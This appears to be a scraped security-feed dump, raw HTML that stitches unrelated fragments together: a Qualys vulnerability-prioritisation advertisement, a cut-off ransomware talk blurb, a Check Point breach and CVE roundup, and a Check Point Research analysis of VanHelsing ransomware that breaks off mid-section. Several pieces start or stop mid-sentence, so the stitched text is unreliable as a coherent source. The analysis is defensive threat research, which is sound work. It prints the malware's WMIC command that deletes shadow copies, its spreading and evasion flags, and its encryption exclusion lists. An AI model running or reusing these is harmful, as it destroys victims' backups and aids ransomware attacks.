&lt;p&gt;&amp;#8220;Considering that they keep them alive and keep spawning more, I assume it might be an efficient thing,&amp;#8221; he said. &amp;#8220;They are on top of DuckDuckGo and Yandex, so it unfortunately works.&amp;#8221;&lt;/p&gt;

&lt;p&gt;In modern DevOps, speed is everything—and so is security. But for most teams, the two feel constantly at odds.&lt;/p&gt;



&lt;p&gt;The reality? &lt;strong&gt;You’re probably spending valuable time fixing vulnerabilities that don’t actually matter.&lt;/strong&gt; Moreover, there’s always the risk of a regression from an unnecessary patch which can further increase the burden on development teams.&lt;/p&gt;



&lt;p&gt;We’ve talked to hundreds of engineering and security teams, and the pattern is clear: developers are getting buried in noise, blocked at security gates, and frustrated by security processes that don’t match the pace of their workflows.&lt;/p&gt;



&lt;p&gt;That’s where &lt;strong&gt;&lt;a href="https://blog.qualys.com/qualys-insights/2022/10/10/in-depth-look-into-data-driven-science-behind-qualys-trurisk"&gt;TruRisk&lt;/a&gt;&lt;/strong&gt;&lt;sup&gt;TM&lt;/sup&gt; from Qualys changes the game — helping you prioritize what matters, reduce alert fatigue, and ship faster without cutting corners.&lt;/p&gt;



&lt;span id="more-37468"&gt;&lt;/span&gt;



&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Visit us at KubeCon to experience see how our QScanner tool brings TruRisk directly into CI/CD pipelines and container workflows. &lt;/strong&gt;&lt;/p&gt;



&lt;div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"&gt;&lt;a class="wp-block-button__link has-white-color has-text-color has-background" href="https://www.qualys.com/forms/container-security/kubecon-emea-2025/" style="background-color: #ed2e26;"&gt;Join the Pilot&lt;/a&gt;&lt;/div&gt;



&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;p&gt;Here are three things you may not know but should.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="1-cut-the-noise-multiple-findings-one-patch"&gt;&lt;strong&gt;1. Cut the Noise: Multiple Findings, One Patch&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;DevSecOps teams are often overwhelmed with vulnerability scan results—dozens, sometimes hundreds, of findings per asset. But here’s the kicker: &lt;strong&gt;many of these findings are just variations of the same root issue.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;With Qualys TruRisk, we’ve reimagined how vulnerabilities are grouped and presented. Each Qualys ID (QID) acts as a &lt;strong&gt;smart summary&lt;/strong&gt;, rolling up multiple technical findings into a &lt;strong&gt;single, actionable insight&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;This isn’t just cosmetic. By reducing redundant signals, DevOps teams spend less time triaging, less time guessing, and more time fixing what actually needs attention.&lt;/p&gt;



&lt;p&gt;And when you combine that with precision severity scoring, the result is clear: &lt;strong&gt;you get a clearer picture of risk with fewer alerts.&lt;/strong&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="2-prioritize-whats-exploitable-not-just-whats-vulnerable"&gt;&lt;strong&gt;2. Prioritize What’s Exploitable—Not Just What’s Vulnerable&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Let’s be honest—not all vulnerabilities are created equal.&lt;/p&gt;



&lt;p&gt;A critical-severity CVE might sound scary, but if it has no known exploit, no active threat intel, and sits in a non-critical part of your stack, &lt;strong&gt;should it really block a release?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;We don’t think so.&lt;/p&gt;



&lt;p&gt;TruRisk uses data from &lt;strong&gt;25+ real-time threat intelligence feeds&lt;/strong&gt; to assess exploitability and real-world attacker interest. That means we’re not just scoring based on CVSS — we’re factoring in how likely a vulnerability is to be targeted in the wild.&lt;/p&gt;



&lt;p&gt;So, instead of chasing ghosts, your team can focus on what matters most: &lt;strong&gt;the vulnerabilities that pose real risk to your actual environment.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;This shift in prioritization and clear instructions on what specifically to patch helps you avoid burnout, reduce mean time to remediation (MTTR), and build trust between engineering and security.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="3-shift-left-critically-with-trurisk"&gt;&lt;strong&gt;3. Shift Left Critically with TruRisk&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;“Shift left” has become a mantra in DevSecOps — but most implementations slow you down. Traditional scanners push vulnerabilities into your pipeline without any sense of context, risk, or criticality. The result? Friction, rework, and security gates that feel more like walls.&lt;/p&gt;



&lt;p&gt;With Qualys TruRisk, you can now &lt;strong&gt;shift left without slowing down&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;By incorporating &lt;strong&gt;runtime asset criticality data&lt;/strong&gt;—like environment sensitivity, business function, and exposure—we help you calculate &lt;strong&gt;TruRisk even during the development phase&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;This means your dev teams can see risk &lt;strong&gt;through the lens of production impact&lt;/strong&gt; — making smarter security decisions early and clearing SecOps reviews with fewer bottlenecks.&lt;/p&gt;

However, large-scale ransomware operations are now adopting the platform to extend their reach into Linux and cloud environments.&lt;/p&gt;
&lt;p&gt;In this talk, Jim Walter reveals how a recent leak from a Mallox ransomware-affiliated actor’s staging server provided insight into how Kryptina has been adapted for use in enterprise attacks.&lt;/p&gt;
&lt;p&gt;The presentation focuses on recent developments and provides an understanding of why threat actors are attracted to the Kryptina platform, and what this means in the context of victims and targeting.&lt;/p&gt;
&lt;p&gt;Jim also dissects what was included in the May 2024 Mallox leak and improvements and modifications that threat actors have made to the Kryptina platform.&lt;/p&gt;

The breach, occurred on February 28, 2025, impacted the blockchain gaming platform’s token holders, potentially exposing them to financial losses.&lt;/li&gt;
&lt;li&gt;Threat actor “rose87168” on a dark web forum has &lt;a href="https://www.ndtvprofit.com/technology/massive-oracle-cloud-breach-compromises-6-million-records-over-140000-businesses-at-risk-says-cloudsek"&gt;claimed&lt;/a&gt; responsibility for an attack against Oracle which allegedly compromised 6M records from its Cloud SSO platform. The breach exposed encrypted SSO passwords, Java KeyStore (JKS) files, and other sensitive credentials, potentially impacting over 140K businesses. Oracle denies it was breached in any way, claiming that published credentials are not for the Oracle Cloud and no Oracle Cloud customers experienced a breach or lost any data.&lt;/li&gt;

&lt;li&gt;Arizona-based Western Alliance Bank has &lt;a href="https://informationsecuritybuzz.com/western-alliance-bank-data-breach/"&gt;suffered&lt;/a&gt; a data breach that resulted in the exposure of sensitive personal and financial information belonging to almost 22K individuals. The breach was caused by an October 2024 cyberattack on a third-party file transfer software, compromising names, Social Security numbers, driver’s license details, and financial account numbers.&lt;/li&gt;
&lt;li&gt;Swiss telecommunications solutions provider Ascom has &lt;a href="https://cybersecuritynews.com/hellcat-ransomware-group-hacked-ascom/"&gt;experienced&lt;/a&gt; a cyberattack that affected the company’s technical ticketing system and resulted in the exfiltration of 44GB of corporate data. The exposed sensitive internal information includes source code, invoices, and confidential documents. The Hellcat ransomware group has claimed responsibility for the attack.&lt;/li&gt;
&lt;li&gt;The Pennsylvania State Education Association (PSEA) has &lt;a href="https://techcrunch.com/2025/03/19/us-teachers-union-says-hackers-stole-sensitive-personal-data-on-over-500000-members/"&gt;disclosed&lt;/a&gt; a data breach from July 2024 that resulted in the theft of sensitive information belonging to over 517,000 members. The stolen data includes government-issued IDs, Social Security numbers, passport details, and financial information.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;US cybersecurity agency CISA &lt;a href="https://www.securityweek.com/cisa-warns-of-exploited-nakivo-vulnerability/"&gt;warned&lt;/a&gt; of an absolute path traversal vulnerability (CVE-2024-48248, CVSS 8.6) in Nakivo Backup and Replication that enables attackers to read arbitrary files and access sensitive data including configuration files and credentials. Exploitation may allow remote code execution and further compromise enterprise environments, with attempts observed in the wild.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check &lt;/em&gt;&lt;em&gt;Point IPS provides protection against this threat &lt;/em&gt;&lt;em&gt;(NAKIVO Arbitrary File Read (CVE-2024-48248))&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;New critical vulnerability (CVE-2024-54085) was &lt;a href="https://thehackernews.com/2025/03/new-critical-ami-bmc-vulnerability.html"&gt;found&lt;/a&gt; in AMI&amp;#8217;s MegaRAC BMC software that enables an authentication bypass via remote management interfaces like Redfish. Exploitation of this flaw allows remote server control, malware deployment, firmware tampering, and potential hardware bricking. Affected devices include HPE Cray XD670, Asus RS720A-E11-RS24U, and ASRockRack.&lt;/li&gt;
&lt;li&gt;A patch has been &lt;a href="https://labs.watchtowr.com/by-executive-order-we-are-banning-blacklists-domain-level-rce-in-veeam-backup-replication-cve-2025-23120/"&gt;released&lt;/a&gt; to address a critical vulnerability (CVE-2025-23120) in Veeam Backup &amp;amp; Replication software that allows remote code execution by authenticated domain users. The flaw stems from inconsistent deserialization handling that permits exploitation via unblocked classes such as Veeam.Backup.EsxManager.xmlFrameworkDs and Veeam.Backup.Core.BackupSummary.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research &lt;a href="https://research.checkpoint.com/2025/vanhelsing-new-raas-in-town/"&gt;uncovered&lt;/a&gt; a new and rapidly growing ransomware-as-a-service (RaaS) affiliate program that is dubbed VanHelsingRaaS. Check Point Research discovered two VanHelsing ransomware variants targeting Windows, but as the RaaS mentions in its advertisement, it provides more offerings “targeting Linux, BSD, ARM, and ESXi systems”. In less than two weeks since its introduction to the cybercrime community, this ransomware operation has already infected three known victims, demanding large ransom payments for decryption and the deletion of stolen data.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check &lt;/em&gt;&lt;em&gt;Point Harmony Endpoint and Threat Emulation provide protection against this threat &lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point researchers have &lt;a href="https://blog.checkpoint.com/securing-user-and-access/is-firebase-phishing-a-threat-to-your-organization/"&gt;reported&lt;/a&gt; about a sophisticated credential harvesting attack that leverages Firebase, a popular web application hosting service. This attack involves the creation of highly convincing and professionally designed phishing web pages that impersonate well-known services.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://www.security.com/threat-intelligence/ransomhub-betruger-backdoor"&gt;found&lt;/a&gt; that affiliates of the RansomHub ransomware-as-a-service (RaaS) operation are utilizing a custom-developed backdoor named &amp;#8216;Betruger&amp;#8217; in their attacks. This multi-functional malware facilitates various malicious activities, including credential dumping, privilege escalation, network scanning, keylogging, and screenshot capturing. The adoption of such a bespoke tool signifies a strategic shift towards minimizing the use of multiple tools during ransomware preparations, thereby reducing the likelihood of detection.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/vanhelsing-new-raas-in-town/"&gt;VanHelsing, new RaaS in Town&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h1 class="wp-block-heading" id="raas-vanhelsing"&gt;Key Points&lt;/h1&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;VanHelsingRaaS&lt;/strong&gt; is a new and rapidly growing ransomware-as-a-service (RaaS) affiliate program launched on March 7, 2025. The RaaS model allows a wide range of participants, from experienced hackers to newcomers, to get involved with a $5,000 deposit. Affiliates keep 80% of the ransom payments, while the core operators earn 20%. The only rule is &lt;em&gt;not to target the Commonwealth of Independent States (CIS)&lt;/em&gt;.&lt;/li&gt;



&lt;li&gt;Check Point Research discovered two VanHelsing ransomware variants targeting Windows, but as the RaaS mentions in its advertisement, it provides more offerings “targeting Linux, BSD, ARM, and ESXi systems”. The program provides an intuitive control panel that simplifies operating ransomware attacks. Check Point Research obtained two variants of the VanHelsing Ransomware, compiled just five days apart. The newest variant shows significant updates, highlighting the fast-paced evolution of this ransomware.&lt;/li&gt;



&lt;li&gt;In less than two weeks since its introduction to the cybercrime community, this ransomware operation has already infected three known victims, demanding large ransom payments for decryption and the deletion of stolen data. During negotiations, they demanded &lt;strong&gt;$500,000&lt;/strong&gt; to be paid to a specified Bitcoin wallet.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="vanhelsing-raas"&gt;VanHelsing RaaS&lt;/h2&gt;



&lt;p&gt;In recent weeks, a new and rapidly expanding ransomware-as-a-service (RaaS) program called &lt;strong&gt;VanHelsingRaaS&lt;/strong&gt; has been making waves in the cybercrime world. Launched on March 7, 2025, this service has already demonstrated its rapid growth and deadly potential, having infected three victims within just two weeks of its introduction. Reputable affiliates can join for free, while new affiliates must pay a $5,000 deposit to gain access to the program. After two blockchain confirmations of the victim&amp;#8217;s ransom payment, the affiliates receive 80% of the revenue, while the remaining 20% is paid to the RaaS operators. Affiliates are provided with an easy-to-use control panel to manage attacks and a cross-platform locker, VanHelsing, which targets a wide variety of systems, including “Windows, Linux, BSD, ARM, and ESXi systems”.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31243" height="590" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId22.png" width="687" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 — VanHelsing RaaS advertisement.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;This multi-platform support significantly broadens the reach of the ransomware, enabling it to target a wide variety of systems. In addition to the locker, affiliates are provided with a dedicated control panel that facilitates the management and execution of ransomware campaigns. However, there is one crucial rule: encryption of systems in CIS (Commonwealth of Independent States) countries is strictly prohibited in typical behavior observed in Russian cybercrime.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31244" height="191" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId25.png" width="615" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 — Rules, CIS countries encryption not allowed.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;

&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31245" height="483" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId28-1024x483.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 — VanHelsing Control Panel.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;In less than two weeks since its introduction to the cybercrime community, this RaaS has already infected three victims, demanding large ransom payments for decryption and the deletion of stolen data. During negotiations, they demanded &lt;strong&gt;$500,000&lt;/strong&gt; to be paid to a specified Bitcoin wallet.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31272" height="656" src="https://research.checkpoint.com/wp-content/uploads/2025/03/Screenshot-2025-03-17-120822-1-1-1024x656.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 — Ransom demand and Bitcoin wallet.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="vanhelsing-ransomware"&gt;VanHelsing Ransomware&lt;/h2&gt;



&lt;p&gt;The ransomware associated with the VanHelsing RaaS was first discovered on March 16, 2025. It is written in C++, and based on the compilation timestamp, the sample appears to have been deployed on the same day against the first victim targeted by this affiliate group. The ransomware accepts multiple command-line arguments that control the encryption process, such as whether to encrypt network and local drives or specific directories and files. It seems that the ransomware is still in its early stages of development, as some functionality appears to be incomplete. While log messages for these features are present, the actual actions associated with them do not seem to be implemented at this stage.&lt;/p&gt;



&lt;p&gt;The ransom note dropped as &lt;code&gt;README.txt&lt;/code&gt; on each enumerated folder, informs the victim that their network has been breached, and their personal data, financial reports, and important documents have been encrypted. The attacker demands Bitcoin for file restoration, warning that the use of third-party decryptors will result in permanent data loss. They warn that their encryption is unbreakable and that paying the ransom is the only way to recover the files. The note ends with an invitation to contact the attacker.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31247" height="426" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId35-1024x426.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 — Ransomware Note.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The ransomware contains two embedded images, which are dropped into the &lt;code&gt;C:\\Windows\\Web&lt;/code&gt; folder. The &lt;code&gt;vhlocker.png&lt;/code&gt; file is used to replace the victim&amp;#8217;s desktop background with the RaaS logo, while &lt;code&gt;vhlocker.ico&lt;/code&gt; is intended to associate the encrypted files, which have the &lt;code&gt;.vanlocker&lt;/code&gt; extension, with the &lt;code&gt;.ico&lt;/code&gt; file type. However, this is a flaw in the ransomware. The encrypted files are actually given the &lt;code&gt;.vanhelsing&lt;/code&gt; extension, not &lt;code&gt;.vanlocker&lt;/code&gt;, meaning the &lt;code&gt;.ico&lt;/code&gt; file is not properly associated with the encrypted files.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31248" height="388" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId38-1024x388.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 — Desktop Background Image.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The ransomware executable still contains the &lt;strong&gt;PDB file path&lt;/strong&gt;, which provides some information about its development environment. This &lt;strong&gt;PDB file&lt;/strong&gt; &lt;strong&gt;path &lt;/strong&gt;includes the development path and project name associated with the malicious program, revealing details that could potentially help trace other projects developed by the same author.&lt;/p&gt;



&lt;p&gt;In this particular case, the &lt;strong&gt;PDB file &lt;/strong&gt;is located at the following path:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;C:\Users\ADMINI~1\AppData\Local\Temp\2\cd9563b4cbc415b3920633b93c0d351b\1-locker\Release\1-locker.pdb&lt;/pre&gt;



&lt;p&gt;Based on this search, Check Point Research discovered two additional files: a second variant of the VanHelsing ransomware, compiled on &lt;strong&gt;March 11, 2025&lt;/strong&gt;, which contains differences compared to the updated version from &lt;strong&gt;March 16&lt;/strong&gt;. The second file, identified based on its PDB path, is an executable that loads an embedded binary into memory. However, the buffer associated with this executable contains no valid data, rendering the loader ineffective.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="technical-analysis"&gt;Technical Analysis&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="command-line-arguments"&gt;Command-line Arguments&lt;/h3&gt;



&lt;p&gt;The &lt;strong&gt;VanHelsing Ransomware&lt;/strong&gt; supports multiple &lt;strong&gt;command-line arguments&lt;/strong&gt;, enabling attackers to fine-tune the encryption process based on their objectives. These arguments dictate various aspects of the ransomware&amp;#8217;s behavior, including target selection, execution parameters, and stealth features. Below are the supported arguments:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;code&gt;-h&lt;/code&gt;, Displays the list of supported command-line arguments and usage instructions for &lt;strong&gt;VanHelsing Ransomware&lt;/strong&gt;.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;-v&lt;/code&gt;, Prints all logs during execution, providing detailed output for debugging or monitoring the ransomware&amp;#8217;s actions.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--no-logs&lt;/code&gt;, Suppresses the printing of logs during ransomware execution.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--Driver $DRIVER&lt;/code&gt;, Specifies a target drive for encryption, allowing the ransomware to encrypt all files and folders on the selected drive.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--Directory $DIRECTORY&lt;/code&gt;, Specifies a target folder for encryption, allowing the ransomware to encrypt all files and subfolders within the selected folder.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--File $FILE&lt;/code&gt;, Specifies the single file to be encrypted.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--Force&lt;/code&gt;, Allows multiple instances of the ransomware to run simultaneously. If the flag is not present, the ransomware attempts to create a mutex &lt;strong&gt;&amp;#8220;Global\VanHelsing&amp;#8221;&lt;/strong&gt;, aborting execution if it already exists, This ensures that only one instance without this flag can run at a time.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--no-priority&lt;/code&gt;, If the flag is not set, the malware increases the priority of its process, causing the system to prioritize the ransomware&amp;#8217;s execution over other processes.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--no-wallpaper&lt;/code&gt;, If this flag is set, the malware will not change the desktop background image.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--no-local&lt;/code&gt;, If this flag is set, the ransomware will not encrypt any local files present on the machine, potentially limiting its attack to network drives, remote systems, or specific directories.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--no-mounted&lt;/code&gt;, This flag ensures that the ransomware only encrypts &lt;strong&gt;fixed local drives&lt;/strong&gt; (the primary hard drive, (&lt;code&gt;DRIVE_FIXED&lt;/code&gt;) and excludes any remote or mounted drives, such as network shares or external storage devices.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--no-network&lt;/code&gt;, When this flag is set, the ransomware will avoid encrypting network drives, focusing only on local drives or other specified targets.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--no-admin&lt;/code&gt;, Allows the ransomware to execute even if the process is not running with administrative privileges.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--Silent&lt;/code&gt;, Silent ransomware process mode; later we elaborate on this feature in more detail. For instance, files on network shares encrypted in this mode won’t have their extension changed.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--skipshadow&lt;/code&gt;, When this command is specified, the ransomware skips the deletion of shadow copies, potentially leaving system backups intact.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--spread-smb&lt;/code&gt;, Enables the ransomware to spread to SMB servers by copying and executing the ransomware from the network shares.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--spread-vcenter&lt;/code&gt;, Not implemented yet, likely indicates that the malware would support a feature for spreading or propagating through a &lt;strong&gt;vCenter&lt;/strong&gt; server. &lt;strong&gt;vCenter&lt;/strong&gt; is a centralized management platform for VMware vSphere environments, often used to manage virtualized infrastructure. This functionality appears to be a placeholder for logic to be added later, potentially making use of exploits. However, currently, the malware simply terminates when this argument is set.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--no-autostart&lt;/code&gt;, Not implemented yet, possibly if this argument is not set, the ransomware would not configure itself to launch automatically when the system boots.&lt;/li&gt;



&lt;li&gt;&lt;code&gt;--system&lt;/code&gt;, which has not been implemented yet. Currently, it simply prints &amp;#8220;&lt;em&gt;Running as a system&lt;/em&gt;&amp;#8221; when the verbose logging argument (&lt;strong&gt;&lt;code&gt;-v&lt;/code&gt;&lt;/strong&gt;) is set.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;We have analyzed two samples of VanHelsing Ransomware, compiled five days apart based on their timestamps. The latest version introduces new command-line arguments and features. This suggests that the malware is actively being updated, and new arguments are likely to be introduced in future versions of the ransomware.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="delete-shadow-copies"&gt;&lt;strong&gt;Delete Shadow Copies&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Shadow copies are backup copies of files or volumes created by Windows&amp;#8217; Volume Shadow Copy Service (VSS), often used for restoring files or recovering from system failures. Ransomware deletes shadow copies to prevent victims from restoring their encrypted files using Windows&amp;#8217; built-in backup mechanisms. By removing these backups, the attackers increase the likelihood that victims will have no choice but to pay the ransom for file recovery.&lt;/p&gt;



&lt;p&gt;In the malicious binary, the function responsible for deleting shadow copies begins by initializing the &lt;strong&gt;Component Object Model (COM)&lt;/strong&gt; through &lt;code&gt;CoInitializeEx&lt;/code&gt; and &lt;code&gt;CoInitializeSecurity&lt;/code&gt;, enabling interaction with system management services. It then determines the system architecture using &lt;code&gt;GetNativeSystemInfo&lt;/code&gt; before creating an instance of the appropriate COM object via &lt;code&gt;CoCreateInstance&lt;/code&gt;, ensuring compatibility with the target environment.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31249" height="390" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId43.png" width="852" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 — COM Initialization and System Architecture Setup.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The malware connects to the &lt;code&gt;ROOT\\CIMV2&lt;/code&gt; namespace and executes a WMI query to retrieve all shadow copies stored on the local system using the &lt;code&gt;Win32_ShadowCopy&lt;/code&gt; class. It allows the malware to access and manage the shadow copies. Then, enumerates through the retrieved shadow copies and creates child processes which delete them by shadow ID.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;"cmd.exe /c C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy where \"ID='%s'\" delete"&lt;/pre&gt;



&lt;h3 class="wp-block-heading" id="local-encryption"&gt;Local Drive Enumeration&lt;/h3&gt;



&lt;p&gt;The ransomware&amp;#8217;s local encryption routine requires obtaining the existing drives. Initially, it calls &lt;code&gt;GetLogicalDriveStringsW(0, 0)&lt;/code&gt;, which returns the buffer size for the logical drive strings. Then, it calls the function again with the correct buffer size, obtaining a buffer with strings that specify valid drives in the system.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31250" height="321" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId47.png" width="670" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 — Function retrieving machine drives.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Once all drives on the machine are identified, the ransomware enumerates them, selecting only fixed local drives and mounted drives unless executed with the &lt;code&gt;--no-mounted&lt;/code&gt; argument, in which case mounted drives are excluded from encryption.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31251" height="248" src="https://research.checkpoint.com/wp-content/uploads/2025/03/3QGTLCJNXC-rId50.png" width="771" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9 — Drive type checks.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The ransomware would later recursively enumerate and encrypt all files and folders on the selected drives, ensuring comprehensive data encryption across the targeted storage locations.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="blacklisted-files-folders"&gt;Blacklisted Files &amp;amp; Folders&lt;/h3&gt;



&lt;p&gt;The ransomware begins the encryption process by enumerating folders and files using the Windows API functions &lt;code&gt;FindFirstFileW&lt;/code&gt;, &lt;code&gt;FindNextFileW&lt;/code&gt;, and &lt;code&gt;FindClose&lt;/code&gt;. To prevent rendering the system completely unusable, it selectively excludes certain folders, files, and file extensions from encryption, ensuring that critical system components remain intact.&lt;/p&gt;



&lt;p&gt;The files contained in the below folders are excluded from encryption:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;"tmp", "winnt", "temp", "thumb", "$Recycle.Bin", "$RECYCLE.BIN", "System Volume Information", "Boot", "Windows", "Trend Micro", "program files", "program files(x86)", "tor browser", "windows", "intel", "all users", "msocache", "perflogs", "default", "microsoft"&lt;/pre&gt;



&lt;p&gt;While the below file extensions and files are excluded from being encrypted for various reasons, mostly due to being critical for Windows functionality:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;".vanlocker", ".exe", ".dll", ".lnk", ".sys", ".msi", "boot.ini", "autorun.inf", "bootfont.bin", "bootsect.bak", "desktop.ini", "iconcache.db", "ntldr", "ntuser.dat", "ntuser.dat.log", "ntuser.ini", "thumbs.db", "GDIPFONTCACHEV1.DAT", "d3d9caps.dat", "LOGS.txt", "README.txt", ".bat", ".bin", ".com", ".cmd", ".386", ".adv", ".ani", ".cab", ".ico", ".mod", ".msstyles", ".msu", ".nomedia", ".ps1", ".rtp", ".syss", ".prf", ".deskthemepack", ".cur", ".cpl", ".diagcab", ".diagcfg", ".diagpkg", ".dll", ".drv", ".hlp", ".pdb", ".hta", ".key", ".lock", ".ldf", ".ocx", ".icl", ".icns", ".ics", ".idx", ".mod", ".mpa", ".msc", ".msp", ".nls", ".rom", ".scr", ".shs", ".spl", ".theme", ".themepack", ".wpx"&lt;/pre&gt;



&lt;p&gt;A similar mistake to the one previously mentioned regarding the &lt;code&gt;.ico&lt;/code&gt; file association occurs in the blacklist of excluded file extensions. The ransomware mistakenly excludes &lt;code&gt;.vanlocker&lt;/code&gt; files from encryption, even though the actual encrypted files use the &lt;code&gt;.vanhelsing&lt;/code&gt; extension. This oversight means that if a second instance of the ransomware runs, it could encrypt already encrypted files again, leading to double encryption.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="network-encryption"&gt;Network Drive Enumeration&lt;/h3&gt;



&lt;p&gt;By default, the ransomware will attempt to encrypt any connected network drives, unless the &lt;code&gt;--no-network&lt;/code&gt; command-line argument is specified. The function responsible for encrypting the network drives runs as a separate thread.&lt;/p&gt;



&lt;p&gt;Initially, retrieves the local hostname and its corresponding IP address, then proceeds to scan a range of IP addresses [1-255). For each IP address in the local network, the thread will attempt to connect to port 445, identifying which machines on the local network are running SMB.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
